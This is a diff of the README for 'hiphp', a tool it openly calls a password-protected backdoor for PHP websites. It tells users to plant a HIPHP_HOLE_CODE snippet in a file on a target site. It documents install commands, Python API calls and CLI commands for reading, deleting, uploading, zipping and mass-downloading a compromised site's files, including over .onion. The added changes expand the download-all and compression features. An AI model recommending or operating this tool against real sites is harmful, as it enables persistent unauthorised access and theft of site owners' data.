@@ -1,10 +1,11 @@
 <img align="right" height="200" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/install/hiphp.png" alt="hiphp by yasserbdj96">
 <h1>hiphp for control php websites.</h1>
-<p>hiphp is BackDoor to control php-based sites hiphp can be controlled by sending commands, files, and tokens to the site using the http/https protocol. After copying the HIPHP_HOLE_CODE and placing it in any php file on the target website, you will have permissions to enter it, read all files, delete and even upload new files to it. Also, this back door is password protected.</p>
+<p>hiphp is BackDoor to control php based sites and hiphp can be controlled by sending commands, files and tokens to the site using http/https protocol. After copying HIPHP_HOLE_CODE and placing it in any php file on the target website, you will have permissions to enter it and read all files, delete, download and even upload new files to it. Hiphp also enables you to connect to ".onion" sites. Also, this back door is password protected.</p>
 
 [![Python package](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app.yml/badge.svg?branch=main)](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app.yml)
 [![pypi-setup](https://github.com/yasserbdj96/hiphp/actions/workflows/pypi-setup.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/pypi-setup.yml)
 [![Docker image](https://github.com/yasserbdj96/hiphp/actions/workflows/docker-image.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/docker-image.yml)
+[![ubuntu install](https://github.com/yasserbdj96/hiphp/actions/workflows/ubuntu-install.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/ubuntu-install.yml)
 [![pages-build-deployment](https://github.com/yasserbdj96/hiphp/actions/workflows/pages/pages-build-deployment/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/pages/pages-build-deployment)
 [![CodeFactor](https://www.codefactor.io/repository/github/yasserbdj96/hiphp/badge)](https://www.codefactor.io/repository/github/yasserbdj96/hiphp)
 
@@ -29,7 +30,7 @@
 [✓] <a href="https://github.com/yasserbdj96/ashar">ashar</a><br>
 [✓] <a href="https://github.com/psf/requests">requests</a><br>
 [✓] <a href="https://github.com/yasserbdj96/hexor">hexor</a><br>
-[✓] <a href="https://github.com/yasserbdj96/asciitext">asciitext</a>
+[✓] <a href="https://github.com/yasserbdj96/biglibrary">biglibrary</a>
 
 <h2>Supported Distributions:</h2>
 
@@ -40,11 +41,6 @@
 | MacOS            | 11.6.6        | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |
 | Android (termux) | 10 (0.118.0)  | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |
 | Android (nethunter)| 10 (2022.3) | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |
-
-<h2>Important Notes:</h2>
-- When you use the program for the first time on a site, the code HIPHP_HOLE_CODE will show you, copy it and upload it to the path you want to connect to, for example 'https://localhost/inc/ex.php'.<br>
-- In order for the program to work well and without errors, HIPHP_HOLE_CODE must be placed at the top of the target file.<br>
-- The program will not work and it will show you a message stating that you are unable to connect to the site if you do not enter the correct path to the location of HIPHP_HOLE_CODE via the link.
 
 <h2>Docker pull,build & run:</h2>
 
@@ -77,6 +73,8 @@
 ```
 # install from pypi:
 >>> pip install hiphp
+# OR
+>>> python -m pip install hiphp
 
 # local install:
 >>> git clone https://github.com/yasserbdj96/hiphp.git
@@ -153,6 +151,16 @@ p1.upload("./examples.php")# Upload a file to the current directory.
 p1.upload("./examples.php","./upload_path/")# Upload a file to a specific directory.
 
 # Example:4
+# Compress a path:
+p1.compress()# Compress the current directory.
+p1.compress("./example/")# Compress a specific directory.
+
+# Example:5
+# download a file:
+p1.download("example.zip")# download a specific file to the current directory.
+p1.download("example.zip","<OUT_PATH>")# download a specific file to specific directory.
+
+# Example:6
 # Command line interface:
 p1.cli()
 #}END.
@@ -166,15 +174,16 @@ hiphp Commands :
          Command                    Description
          -------                    -----------
 [OPTIONS]─────┐
-  ┌───────────┘
+  ┌──────────┘
   ├─> --help                        ─> # Display this help.
+  ├─> --help [ACTIONS]              ─> # Help for a specific command.
   ├─> --geth                        ─> # Get the hole Code, "HIPHP_HOLE_CODE" It has the same purpose.
   ├─> --phpinfo                     ─> # Some information about the server.
   ├─> --cls                         ─> # Clear console.
   ├─> --exit                        ─> # Exit this console.
 ┌─┘
 └[ACTIONS]────┐
-  ┌───────────┘
+  ┌──────────┘
   ├─> --ls                          ─> # List information about the FILEs (the current directory by default).
   ├─> Usage: --ls [OPTION] [PATH]
   ├┬> Mandatory arguments to long options:
@@ -201,9 +210,26 @@ hiphp Commands :
   ├┬> Mandatory arguments to long options:
   │├─> --up [FILE_PATH]             ─> # Upload a file to the current directory.
   │└─> --up [FILE_PATH] [PATH]      ─> # Upload a file to a specified directory.
+  ├─────────────────────────── ─ ─ ─
+  ├─> --down                            ─> # download a file.
+  ├─> Usage: --down [-f/-d] [FILE/DIR_PATH] [OUT_PATH]
+  ├┬> Mandatory arguments to long options:
+  │├─> --down -f [FILE_PATH]            ─> # Download a file to the current directory.
+  │├─> --down -f [FILE_PATH] [OUT_PATH] ─> # Download file to a specified directory.
+  │├─> --down -d [DIR_PATH]             ─> # Download a folder to the current directory.
+  │├─> --down -d [DIR_PATH] [OUT_PATH]  ─> # Download folder to a specified directory.
+  │├─> --down -all                      ─> # Download all files to the current directory.
+  │└─> --down -all [OUT_PATH]           ─> # Download all files to a specified directory.
+  ├─────────────────────────── ─ ─ ─
+  ├─> --zip                        ─> # Compress a directory.
+  ├─> Usage: --zip [DIR_PATH]
+  ├┬> Mandatory arguments to long options:
+  │├─> --zip                       ─> # Compress the current directory.
+  │└─> --zip [DIR_PATH]            ─> # Compress a specific directory.
+  ├─────────────────────────── ─ ─ ─
 ┌─┘
 └[ABOUT]─────┐
-  ┌──────────┘
+  ┌─────────┘
   ├─> --update                      ─> # check for updates.
   ├─> --license                     ─> # This project license.
   ├─> --about                       ─> # About this project.
@@ -245,14 +271,21 @@ hiphp Commands :
 <h2>Changelog History:</h2>
 
 ```
+## 0.2.23 [22-08-2022][Last Version]
+ - Fix the entry with uppercase and lowercase letters.
+ - Add "--down" command for Download files & folders.
+ - Add "--zip" command for Compress files & folders.
+ - Update "--help" to "--help [ACTION]".
+ - Update the help list and enable it to display help when something goes wrong.
+
 ## 0.2.22 [20-08-2022]
  - Update some info on pypi.
  - Fix "setup.py" windows os.
  - Bug fixes & performance improvements.
 
 ## 0.2.21 [18-08-2022]
- - Add "--update" command.
- - Add "--phpinfo" command.
+ - Add "--update" command for check updates.
+ - Add "--phpinfo" command for check some server informations.
  - Fix not being able to install internally on Nethunter.
  - Fix some issues in uploading files.
  - Bug fixes & performance improvements.
@@ -260,7 +293,7 @@ hiphp Commands :
 ## 0.2.20 [10-08-2022]
  - Change the display of files in the command "--ls"
  - Fix "HIPHP_HOLE_CODE".
- - Add "--cls" to clear console.
+ - Add "--cls" command to clear console.
  - Slight change to the command line interface logo.
  - Bug fixes & performance improvements.
 
@@ -276,10 +309,10 @@ hiphp Commands :
 ## 0.2.17 [03-07-2022]
  - Bug fixes on windows os.
 
-## 0.2.16 [02-07-2022]
+## 0.2.16 [02-07-2022][Version cancelled]
  - Bug fixes & performance improvements.
 
-## 0.2.15 [22-06-2022]
+## 0.2.15 [22-06-2022][Version cancelled]
  - New build.
  - More stability.
  - Command interface update.
@@ -288,80 +321,83 @@ hiphp Commands :
  - help menu update.
  - Bug fixes & performance improvements.
 
-## 0.1.14
+## 0.1.14 [06-11-2021][Version cancelled]
  - help menu update.
  - Bug fixes & performance improvements.
 
-## 0.1.13
+## 0.1.13 [09-11-2021][Version cancelled]
  - Safety upgrade.
  - Bug fixes & performance improvements.
 
-## 0.1.12
+## 0.1.12 [09-11-2021][Version cancelled]
  - Safety upgrade.
  - Bug fixes & performance improvements.
 
-## 0.1.11
+## 0.1.11 [03-11-2021][Version cancelled]
  - Command interface update.
  - Bug fixes & performance improvements.
 
-## 0.1.10
+## 0.1.10 [26-07-2021][Version cancelled]
  - Fix Bugs.
 
-## 0.1.9
+## 0.1.9 [07-06-2021][Version cancelled]
  - fix bugs.
 
-## 0.1.8
+## 0.1.8 [2021][Version cancelled]
  - Fix bugs.
 
-## 0.1.7
+## 0.1.7 [04-06-2021][Version cancelled]
  - fix bugs.
 
-## 0.1.6
+## 0.1.6 [04-06-2021][Version cancelled]
  - fix bugs.
  - add upload to upload any file.
  - Simplify the use of the program.
 
-## 0.1.5
+## 0.1.5 [26-05-2021][Version cancelled]
  - fix bugs.
 
-## 0.1.4
+## 0.1.4 [15-05-2021][Version cancelled]
  - fix bugs.
  - new build.
 
-## 0.1.3
+## 0.1.3 [12-05-2021][Version cancelled]
  - Fix bugs.
 
-## 0.1.2
+## 0.1.2 [10-05-2021][Version cancelled]
  - Fix bugs.
 
-## 0.1.1
+## 0.1.1 [06-05-2021][Version cancelled]
  - Import pakages by pipincluder.
  - Fix bugs.
 
-## 0.1.0
+## 0.1.0 [18-04-2021][Version cancelled]
  - New build.
  - Fix bugs.
 
-## 0.0.4
+## 0.0.4 [06-04-2021][Version cancelled]
  - Fix bugs.
 
-## 0.0.3
+## 0.0.3 [06-04-2021][Version cancelled]
  - Fix bugs.
 
-## 0.0.2
+## 0.0.2 [05-04-2021][Version cancelled]
  - Fix bugs.
  - Add help list.
  - Add Executing from files.
 
-## 0.0.1
+## 0.0.1 [05-04-2021][Version cancelled]
  - First public release.
 ```
 
+<h2>Important Notes:</h2>
+- When you use the program for the first time on a site, the code HIPHP_HOLE_CODE will show you, copy it and upload it to the path you want to connect to, for example 'https://localhost/inc/ex.php'.<br>
+- In order for the program to work well and without errors, HIPHP_HOLE_CODE must be placed at the top of the target file.<br>
+- The program will not work and it will show you a message stating that you are unable to connect to the site if you do not enter the correct path to the location of HIPHP_HOLE_CODE via the link.<br>
+- I AM NOT RESPONSIBLE HOW YOU USE MY TOOLS/PROGRAMS/PROJECTS. BE LEGAL AND NOT STUPID.<br>
+- Don't forget to star ⭐ this repository.
+
 <h1></h1> 
-
-
-Don't forget to star ⭐ this repository
-<br>
 
 all posts [`#yasserbdj96`](#yasserbdj96) ,all views my own.
 
@@ -369,3 +405,5 @@ all posts [`#yasserbdj96`](#yasserbdj96) ,all views my own.
 <div align="center">
     <a href="http://yasserbdj96.github.io/">Go to this link to get more information.</a>
 </div>
+
+[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/L3L34CEPV)
